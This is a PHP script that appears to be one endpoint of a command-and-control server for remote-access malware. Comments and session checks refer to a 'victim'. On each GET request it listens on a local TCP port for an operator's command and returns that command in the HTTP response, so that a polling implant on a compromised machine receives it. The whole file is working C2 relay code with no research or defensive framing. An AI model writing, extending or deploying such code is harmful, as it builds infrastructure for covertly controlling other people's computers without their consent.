<?php
	include('../modules/utils.php');
	include('../modules/sessionManager.php');
	include('../modules/databaseManager.php');

	/*
	Function that carries the main feature in the script.
	Return true if the feature executed on success. Else return false.
	*/
	function run($databaseManager, $conn, $sessionManager){
		# Check if the session is already stored
		if($sessionManager->isCurrentSessionStored("victim")){
			if($_SERVER["REQUEST_METHOD"] == "GET"){

                # Connection parameters
                $address = "127.0.0.1";
                $port = 10000;
                # Don't timeout
                #set_time_limit(30);

                /*
                Create socket with:
                    AF_INET, meaning IPv4.
                    SOCK_STREAM, meaning stream of bytes, not datagrams on
                    transport layer.
                    SOL_TCP, meaning to use tcp on transport layer.
                */
                $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                if($sock === false){
                    echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
                    # 500 Internal Server Error
                    http_response_code(500);
					return false;
                }

				# Try to bind to port multiple times
				$result = socket_bind_loop($sock, $address, $port,
					SOCKET_BIND_INTERVAL,SOCKET_BIND_MAX_ATTEMPT_NUMBER, DEBUG);

                if ($result === false) {
                    echo "socket_bind() failed.\nReason: ($result) " . socket_strerror(socket_last_error($sock)) . "\n";
                    # 500 Internal Server Error
                    http_response_code(500);
					return false;
                }

				/*
				$result = false;
				while(!$result){
					usleep(SOCKET_BIND_INTERVAL);
					# Disable warnings
					#error_reporting(E_ALL ^ E_WARNING);
					# Try to connect to victim
                	$result = socket_bind($sock, $address, $port);
					# Enable warnings
					#error_reporting(E_ALL);
				}
				*/
				/*
                # Assign address and port to socket
                if(socket_bind($sock, $address, $port) === false){
                    echo "socket_bind() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
                    # 500 Internal Server Error
                    http_response_code(500);
					return 1;
                }
				*/

                /*
                Start listening on port with backlog of 50. It means that it
                will accept up to 50 connections in the queue and then refuse
                the rest of the connections.
                */
                if (socket_listen($sock, 50) === false) {
                    echo "socket_listen() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
                    # 500 Internal Server Error
                    http_response_code(500);
					socket_close($sock);
					return false;
                }

                # Accept socket connection
                if (($msgsock = socket_accept($sock)) === false) {
                    echo "socket_accept() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
                    # 500 Internal Server Error
                    http_response_code(500);
					socket_close($sock);
					return false;
                }

                # Read command
                $command = "";
                while($out = socket_read($msgsock, 2048)) {
                    $command .= $out;
                }

                # Send command to victim
                echo $command;

                # Close connections
                socket_close($msgsock);
                socket_close($sock);
            }

        }else{
            echo "Your user is not logged. First login, then enter this page.";
            // 401 Unauthorized
            http_response_code(401);
			return false;
        }

		return true;
	}

    function main(){
        # Connect to database
        $databaseManager = new DatabaseManager();
        $conn = $databaseManager->connectToDatabase();

		# Start session control
        $sessionManager = new SessionManager($conn);
        $sessionManager->startSessionControl();

		# Function that carries the main feature in the script
		run($databaseManager, $conn, $sessionManager);

        # Disconnect from database
        $databaseManager->disconnectFromDatabase();
    }

    main();

?>
